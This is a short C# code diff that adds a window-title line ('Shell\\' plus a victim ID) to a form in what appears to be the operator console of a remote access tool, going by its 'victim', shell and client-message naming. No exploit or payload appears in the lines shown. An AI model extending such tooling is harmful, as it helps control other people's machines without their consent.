@@ -28,6 +28,8 @@ namespace Eden
 
             m_victim = victim;
             m_szInitDir = szInitDir;
+
+            Text = $@"Shell\\{victim.m_szID}";
         }
 
         private void fnReceived(clsClient m_clnt, string szVictimID, List<string> asMsg)
